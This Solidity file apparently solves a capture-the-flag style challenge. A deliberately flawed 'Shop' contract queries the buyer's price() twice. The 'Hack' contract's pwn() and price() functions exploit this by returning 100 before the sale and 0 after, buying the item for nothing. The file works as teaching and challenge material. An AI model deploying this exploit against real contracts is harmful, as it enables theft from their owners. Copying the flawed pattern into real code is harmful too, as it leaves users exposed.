// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack{
    Shop private immutable trgt;
    constructor(address _trgt) {
        trgt = Shop(_trgt);
    }
    function pwn() external {
        trgt.buy();
        require(trgt.price() == 0, "Failed!");
    }
    function price() external view returns (uint){
        if(trgt.isSold() == true){
            return 0;
        }   else{
            return 100;
        }
    }
}